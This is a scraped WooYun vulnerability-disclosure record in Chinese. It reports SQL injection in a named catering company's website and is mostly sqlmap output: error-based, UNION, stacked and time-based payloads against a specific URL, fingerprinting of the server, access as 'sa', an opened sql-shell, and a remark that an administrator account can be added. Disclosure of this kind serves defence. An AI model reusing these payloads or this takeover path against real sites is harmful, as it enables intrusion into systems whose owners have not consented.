{"id": 57557, "wybug_id": "wooyun-2014-054003", "wybug_title": "味捷餐饮有限公司官网存在注入漏洞致服务器沦陷", "wybug_corp": "400712312。com", "wybug_author": "follow me", "wybug_date": "2014-04-01 11:15", "wybug_open_date": "2014-04-06 11:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-06：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 味捷餐饮有限公司官网存在注入漏洞致服务器沦陷 详细说明：  http://www.4007123123.com/userhome/ajax/getaddressbase.aspx?cityid=1存在sql注入\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: cityid    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: cityid=1' AND 4512=CONVERT(INT,(CHAR(58)+CHAR(110)+CHAR(114)+CHAR(118)+CHAR(58)+(SELECT (CASE WHEN (4512=4512) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(120)+CHAR(118)+CHAR(58))) AND 'Vtfi'='Vtfi    Type: UNION query    Title: Generic UNION query (NULL) - 17 columns    Payload: cityid=1' UNION ALL SELECT NULL,CHAR(58)+CHAR(110)+CHAR(114)+CHAR(118)+CHAR(58)+CHAR(89)+CHAR(82)+CHAR(109)+CHAR(72)+CHAR(85)+CHAR(71)+CHAR(88)+CHAR(73)+CHAR(65)+CHAR(87)+CHAR(58)+CHAR(108)+CHAR(120)+CHAR(118)+CHAR(58),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: cityid=1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: cityid=1' WAITFOR DELAY '0:0:5'-----[13:49:15] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005\n用户 sa\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: cityid    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: cityid=1' AND 4512=CONVERT(INT,(CHAR(58)+CHAR(110)+CHAR(114)+CHAR(118)+CHAR(58)+(SELECT (CASE WHEN (4512=4512) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(108)+CHAR(120)+CHAR(118)+CHAR(58))) AND 'Vtfi'='Vtfi    Type: UNION query    Title: Generic UNION query (NULL) - 17 columns    Payload: cityid=1' UNION ALL SELECT NULL,CHAR(58)+CHAR(110)+CHAR(114)+CHAR(118)+CHAR(58)+CHAR(89)+CHAR(82)+CHAR(109)+CHAR(72)+CHAR(85)+CHAR(71)+CHAR(88)+CHAR(73)+CHAR(65)+CHAR(87)+CHAR(58)+CHAR(108)+CHAR(120)+CHAR(118)+CHAR(58),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: cityid=1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: cityid=1' WAITFOR DELAY '0:0:5'-----[13:44:55] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005[13:44:55] [INFO] fetching current usercurrent user:    'sa'\nsql-shell下可添加服务器管理员用户：\n[13:56:52] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2005[13:56:52] [INFO] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTERsql-shell>\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  服务器沦陷原因：1:存在sql注入，sa未降权，sqlserver运行在system权限下尽快修复吧   版权声明：转载请注明来源 follow me@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-04-06 11:16 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-09 16:08 |    \t\tfollow me \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 可是大海还在那里。海里的鱼不会再爬上岸。...)\t\t \n  这。。。。    \n     2014-06-08 11:17 |    \t\t我来找快乐 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:2        | 我来找快乐)\t\t \n  。。。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}